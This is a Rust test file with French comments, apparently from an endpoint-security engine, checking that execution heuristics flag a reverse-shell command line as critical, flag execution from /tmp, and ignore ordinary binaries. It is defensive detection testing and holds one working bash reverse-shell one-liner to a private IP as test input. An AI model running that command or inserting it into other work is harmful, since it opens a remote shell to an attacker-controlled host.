//! Validation Lot 3 : heuristiques d'exécution (reverse shell, zone inscriptible).

use aegis_core::{
    Action, Engine, EventEnvelope, EventPayload, EventSource, FileEvent, FileOp, ProcessCtx,
    Severity, ThreatCategory, SCHEMA_VERSION,
};
use aegis_detection::ExecHeuristics;

fn exec_event(path: &str, cmdline: &str) -> EventEnvelope {
    EventEnvelope {
        schema_version: SCHEMA_VERSION,
        event_id: 1,
        ts: 0,
        source: EventSource::Fanotify,
        process: ProcessCtx {
            pid: 777,
            ppid: 1,
            tgid: 777,
            exe_path: path.into(),
            comm: "sh".into(),
            cmdline: cmdline.into(),
            uid: 1000,
            euid: 1000,
            gid: 1000,
            caps_effective: 0,
            cgroup_id: 0,
            container_id: None,
            app: None,
        },
        payload: EventPayload::File(FileEvent {
            path: path.into(),
            op: FileOp::OpenExec,
            blocking: true,
            response_token: None,
        }),
    }
}

#[test]
fn reverse_shell_cmdline_est_critique() {
    let v = ExecHeuristics::evaluate(&exec_event(
        "/usr/bin/bash",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ))
    .expect("reverse shell doit être détecté");
    assert_eq!(v.engine, Engine::Behavioral);
    assert_eq!(v.severity, Severity::Critical);
    assert_eq!(v.category, ThreatCategory::CommandAndControl);
    assert_eq!(v.recommended_action, Action::Kill { pid: 777 });
}

#[test]
fn exec_zone_inscriptible_est_high_notify() {
    let v = ExecHeuristics::evaluate(&exec_event("/tmp/dropper", "/tmp/dropper"))
        .expect("exec /tmp doit être signalé");
    assert_eq!(v.severity, Severity::High);
    assert_eq!(v.category, ThreatCategory::Execution);
    assert_eq!(v.recommended_action, Action::Notify);
}

#[test]
fn exec_systeme_normal_ignore() {
    assert!(ExecHeuristics::evaluate(&exec_event("/usr/bin/ls", "ls -la")).is_none());
}
